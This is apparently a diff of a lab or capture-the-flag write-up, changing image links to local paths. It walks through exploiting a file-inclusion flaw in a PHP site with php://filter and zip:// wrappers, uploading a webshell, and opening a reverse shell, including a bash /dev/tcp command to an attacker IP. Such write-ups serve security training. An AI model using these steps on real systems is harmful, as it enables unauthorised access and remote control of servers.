@@ -18,27 +18,44 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 ## 80 HTTP
-![image](https://hackmd.io/_uploads/rJG7tX4j-l.png)
-![image](https://hackmd.io/_uploads/SJoMLQEsbg.png)
-![image](https://hackmd.io/_uploads/r1zD8mEsWe.png)
+
+![image](_assets/rJG7tX4j-l.png)
+
+![image](_assets/SJoMLQEsbg.png)
+
+![image](_assets/r1zD8mEsWe.png)
+
 `http://192.168.194.229/index.php?file=http://....` -> `fail`
 `http://192.168.194.229/index.php?file=file://....` -> `fail`
 `http://192.168.194.229/index.php?file=php://....` -> `works`
 `http://192.168.194.229/index.php?file=php://filter/convert.base64-encode/resource=upload`
-![image](https://hackmd.io/_uploads/ByQLqmNi-e.png)
-![image](https://hackmd.io/_uploads/HJ5q9XViZx.png)
-![image](https://hackmd.io/_uploads/ryFoqXEsZg.png)
+
+![image](_assets/ByQLqmNi-e.png)
+
+![image](_assets/HJ5q9XViZx.png)
+
+![image](_assets/ryFoqXEsZg.png)
+
 upload an webshell, and download a zip file from target response, zip name is `upload_1774626502.zip`
 `http://192.168.194.229/index.php?file=zip://uploads/upload_1774626502.zip%23rev.php` -> `fail`
 `http://192.168.194.229/index.php?file=zip://uploads/upload_1774626502.zip%23rev` -> `works`
-![image](https://hackmd.io/_uploads/SkTs67Ni-g.png)
+
+![image](_assets/SkTs67Ni-g.png)
+
 `http://192.168.194.229/index.php?file=zip://uploads/upload_1774626502.zip%23rev&cmd=bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.45.205%2F80+0%3E%261` -> `somehow not working`
-![image](https://hackmd.io/_uploads/r1jTA74sWe.png)
+
+![image](_assets/r1jTA74sWe.png)
+
 `http://192.168.194.229/index.php?file=zip://uploads/upload_1774628460.zip%23pentestmonkey`
-![image](https://hackmd.io/_uploads/S1PyyVNibe.png)
+
+![image](_assets/S1PyyVNibe.png)
 
 ## Privilege Escalation
-![image](https://hackmd.io/_uploads/By3IZVNiWx.png)
-![image](https://hackmd.io/_uploads/Skm6XNNiZx.png)
-![image](https://hackmd.io/_uploads/H1M0m4ViWx.png)
-![image](https://hackmd.io/_uploads/HyvxBE4obl.png)
+
+![image](_assets/By3IZVNiWx.png)
+
+![image](_assets/Skm6XNNiZx.png)
+
+![image](_assets/H1M0m4ViWx.png)
+
+![image](_assets/HyvxBE4obl.png)
